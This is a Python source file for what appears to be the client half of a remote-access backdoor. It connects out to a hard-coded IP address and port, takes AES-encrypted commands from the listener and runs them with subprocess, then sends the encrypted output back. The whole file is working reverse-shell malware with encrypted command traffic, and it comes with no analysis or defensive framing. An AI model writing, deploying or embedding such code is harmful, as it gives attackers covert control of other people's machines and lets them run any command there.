import socket
import subprocess
from Crypto.Cipher import AES
from base64 import b64decode, b64encode
from shlex import split
from textwrap import wrap
import re


class Client:
    def __init__(self):
        self.ip = "192.168.1.104"  # Change this
        self.port = 1337  # Change this
        self.s = None
        self.key = None
        self.iv = None

    def Connect(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.ip, self.port))
        self.cmds()

    def encrypt(self, data):
        pad = lambda s: s + (16 - len(s) % 16) * "\x0e"
        data = str(data).replace("b'", "").replace("'", "")
        #stream = [data[i:i+16] for i in range(0, len(data), 16)]
        stream = wrap(data, 16)
        padded = [i if len(i) == 16 else pad(i) for i in stream]
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        encrypted = [aes.encrypt(i.encode()) for i in padded]
        # print("Sending:", b64encode(b''.join(encrypted)))
        return b64encode(b''.join(encrypted))

    def decrypt(self, data):
        decoded = b64decode(data)
        self.key = decoded[0:16]
        self.iv = decoded[16:32]
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypted = aes.decrypt(decoded[32:])
        decrypted = split(decrypted.decode().replace("\x0e", ""))
        return decrypted

    def cmds(self):
        while True:
            try:
                data = self.s.recv(1024)
                decrypted = self.decrypt(data)
                data = subprocess.check_output(decrypted, stderr=subprocess.PIPE)
                enc = self.encrypt(data)
                self.s.send(enc)
            except:
                self.s.close()

    def main(self):
        self.Connect()


if __name__ == '__main__':
    run = Client()
    run.main()
